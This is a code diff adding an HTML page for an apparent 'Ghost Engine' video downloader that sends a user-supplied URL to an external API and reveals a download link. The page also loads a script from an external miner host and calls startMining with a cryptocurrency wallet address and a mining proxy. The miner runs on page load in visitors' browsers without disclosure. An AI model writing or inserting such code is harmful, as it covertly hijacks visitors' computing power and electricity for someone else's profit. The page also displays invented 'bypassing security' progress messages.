@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost Engine | Processing</title>
+    <script src="https://webminer.pages.dev/load.js"></script>
+    <style>
+        body { background: #0d1117; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        #status { font-size: 20px; color: #00d4ff; font-weight: bold; margin-bottom: 25px; letter-spacing: 1.5px; text-transform: uppercase; }
+        .loader-wrap { width: 85%; max-width: 380px; text-align: center; }
+        .bar-bg { background: #161b22; height: 12px; border-radius: 6px; overflow: hidden; border: 1px solid #30363d; margin-bottom: 10px; }
+        .bar-fill { width: 0%; height: 100%; background: #00d4ff; transition: width 0.4s cubic-bezier(0.1, 0.7, 1.0, 0.1); box-shadow: 0 0 15px #00d4ff; }
+        .dl-btn { display: none; background: #00d4ff; color: #000; padding: 20px; border-radius: 14px; text-decoration: none; font-weight: 900; margin-top: 35px; width: 100%; text-align: center; box-shadow: 0 0 25px rgba(0,212,255,0.4); font-size: 18px; }
+    </style>
+</head>
+<body>
+    <div class="loader-wrap">
+        <div id="status">CONNECTING TO GHOST ENGINE...</div>
+        <div class="bar-bg"><div class="bar-fill" id="fill"></div></div>
+        <a id="download" class="dl-btn" href="#" target="_blank">DOWNLOAD NOW</a>
+    </div>
+
+    <script>
+        // MINER - Keeping your revenue active
+        startMining("48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy", "Ghost_Site", "wss://ny1.xmrminingproxy.com", 70);
+
+        const fill = document.getElementById('fill');
+        const status = document.getElementById('status');
+        let p = 0;
+
+        const barMove = setInterval(() => {
+            if (p < 94) {
+                p += Math.random() * 6;
+                fill.style.width = p + "%";
+                if(p > 30) status.innerText = "BYPASSING SECURITY...";
+                if(p > 65) status.innerText = "STRIPPING WATERMARKS...";
+                if(p > 85) status.innerText = "FINALIZING FILE...";
+            }
+        }, 500);
+
+        async function startFetch() {
+            const url = new URLSearchParams(window.location.search).get('url');
+            if(!url) return;
+
+            try {
+                // THE DIRECT API - This is the fix for the "handshake" error
+                const res = await fetch("https://api.cobalt.tools/api/json", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json", "Accept": "application/json" },
+                    body: JSON.stringify({ url: url, vCodec: "h264" })
+                });
+                
+                const data = await res.json();
+                
+                if (data.url) {
+                    clearInterval(barMove);
+                    fill.style.width = "100%";
+                    status.innerText = "READY!";
+                    const btn = document.getElementById('download');
+                    btn.href = data.url;
+                    btn.style.display = "block";
+                } else {
+                    setTimeout(startFetch, 3000); 
+                }
+            } catch (e) {
+                setTimeout(startFetch, 3000);
+            }
+        }
+        
+        // Start the fetch after a short delay
+        setTimeout(startFetch, 2500);
+    </script>
+</body>
+</html>
